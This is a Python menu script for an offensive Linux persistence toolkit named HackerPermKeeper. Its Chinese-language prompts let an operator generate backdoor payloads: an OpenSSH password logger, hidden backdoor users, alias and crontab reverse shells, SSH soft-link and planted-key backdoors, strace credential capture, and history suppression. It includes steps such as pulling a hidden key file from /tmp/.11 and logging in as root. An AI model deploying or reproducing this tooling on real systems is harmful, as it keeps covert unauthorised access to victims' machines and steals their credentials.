# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
from colorama import init
from termcolor import colored
import os



init()


def Dowfile(input_files,file_name):
    if not os.path.exists('payloads'):
        os.makedirs('payloads')
    with open(input_files, 'r', encoding='utf-8') as input_file, open('payloads/'+file_name, 'w+',encoding='utf-8') as output_file:
        # 读取输入文件的内容
        content = input_file.read()

        # 将内容写入输出文件
        output_file.write(content)
        print(f'生成成功,文件为：/payloads/{file_name}')


def chooses():
    s = []
    i = 0
    print(colored('HackerPermKeeper v2.0 弱鸡 支持以下漏洞检测 https://github.com/RuoJi6/HackerPermKeeper', 'green'))
    print(colored('1--------------OpenSSH后门', 'yellow'),colored('[利用]', 'red'))
    print(colored('2--------------后门用户', 'yellow'),colored('[利用]', 'red'))
    print(colored('3--------------Alias后门', 'yellow'),colored('[利用]', 'red'))
    print(colored('4--------------crontab计划任务', 'yellow'),colored('[利用]', 'red'))
    print(colored('5--------------ssh软链接后门', 'yellow'),colored('[利用]', 'red'))
    print(colored('6--------------ssh公私密钥后门', 'yellow'),colored('[利用]', 'red'))
    print(colored('7--------------Strace后门', 'yellow'),colored('[利用]', 'red'))
    print(colored('8--------------Rootkit后门', 'yellow'),colored('[检测]', 'blue'))
    print(colored('9--------------不记录命令[history]', 'yellow'), colored('[利用]', 'red'))
    print(colored('10--------------ssh软链接&crontab', 'yellow'), colored('[利用]', 'red'))
    print(colored('HackerPermKeeper[请输入多个模块序号, 一行一个，输入exit输出完成]', 'green'))
    while True:
        a = input(colored(f'[{i}]:', 'green'))
        if a in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','exit']:
            i = i + 1
            if a != 'exit':
                if a == str(1):
                    print('请修改生成完的文件，里面的记录明文的文件位置')
                    Dowfile('payload/1OpenSSH/sshOpenSSH.py','sshOpenSSH.py')
                    break
                elif a == str(2):
                    print('请修改生成完的文件，里面的用户名和密码')
                    i = input('创不创home目录下用户文件夹[不创建的话，使用会出现一些bug，建议创建]：[1]不创建  [2]创建:')
                    if i == '1':
                        Dowfile('payload/2adduser/adduser.py','adduser.py')
                    elif i == '2':
                        Dowfile('payload/2adduser/adduser_new_user.py','adduser_new_user.py')
                    else:
                        print('输入错误')
                    break
                elif a == str(3):
                    print('请修改生成完的文件，里面的反弹shell的ip以及port')
                    i = input('输入python版本[3 or 2]:')
                    if i == '3':
                        Dowfile('payload/3alerts/alerts.py','alerts.py')
                    elif i == '2':
                        Dowfile('payload/3alerts/alerts2.py','alerts2.py')
                    else:
                        print('输入错误')
                    break
                elif a == str(4):
                    print('请修改生成完的文件，里面的反弹shell的ip以及port')
                    i = input('计划任务后门分为：[1]直接写入/etc/crontab文件中 or [2]直接使用crontab命令生成:')
                    if i == '1':
                        Dowfile('payload/4crontab/etc_Cron.py', 'etc_Cron.py')
                    elif i == '2':
                        Dowfile('payload/4crontab/Cron_n.py', 'Cron_n.py')
                    else:
                        print('输入错误')
                    break
                elif a == str(5):
                    print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                    Dowfile('payload/5ssh_Soft_link/ssh_Soft_link.py', 'ssh_Soft_link.py')
                    break
                elif a == str(6):
                    i = input('ssh公私密钥后门分为：[1]在自己服务器生成 or [2]在目标机器生成:')
                    if i == '1':
                        print(
                            '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
                        Dowfile('payload/6sshkey/sshkey_local.py', 'sshkey_local.py')
                        break
                    elif i == '2':
                        print('生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 root@ip  如果连接报错，请输入chmod 600 .11'
                              '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
                        Dowfile('payload/6sshkey/sshkey_target.py', 'sshkey_target.py')
                        break
                    else:
                        print('输入错误')
                        break
                elif a == str(7):
                    print('请修改生成完的文件，里面的记录明文的文件位置')
                    Dowfile('payload/7strace/sshd.py','sshd.py')
                    break
                elif a == str(8):
                    print('项目地址：https://github.com/f0rb1dd3n/Reptile/')
                    break
                elif a == str(9):
                    Dowfile('payload/9HISTCONTROL/HISTCONTROL.py', 'HISTCONTROL.py')
                    break
                elif a == str(10):
                    i = input('计划任务&软链接后门：[1]使用/etc/文件维持 or [2]使用直接使用crontab命令维持:')
                    if i == '1':
                        print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                        Dowfile('payload/10ssh_Soft_link_cromtab/ssh_Soft_link_etc_Cron.py', 'ssh_Soft_link_etc_Cron.py')
                        break
                    elif i == '2':
                        print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                        Dowfile('payload/10ssh_Soft_link_cromtab/ssh_Soft_link_Cron_n.py', 'ssh_Soft_link_Cron_n.py')
                        break
                    else:
                        print('输入错误')
                        break
                else:
                    print('Null')
                    break
            else:
                pass
                break
        else:
            print("输入无效，请重新输入！")
            a = input(colored(f'[{i}]:', 'green'))
